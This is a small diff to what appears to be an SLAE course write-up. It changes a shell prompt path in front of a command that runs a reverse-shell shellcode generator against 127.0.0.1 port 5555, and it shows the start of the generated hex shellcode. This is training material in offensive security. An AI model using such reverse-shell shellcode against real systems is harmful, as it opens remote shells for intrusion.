@@ -687,7 +687,7 @@ else:
 The Python code dynamically generates shellcode in hex format based on the user input, calculating the shellcode length and checking for Null bytes in the process: 
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE/Assignment_2$ python reverse_shell_tcp_wrapper.py 127.0.0.1 5555
+osboxes@osboxes:~/Downloads/SLAE$ python reverse_shell_tcp_wrapper.py 127.0.0.1 5555
 Generated shellcode using custom IP: 127.0.0.1 and custom port: 5555
 
 \x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff
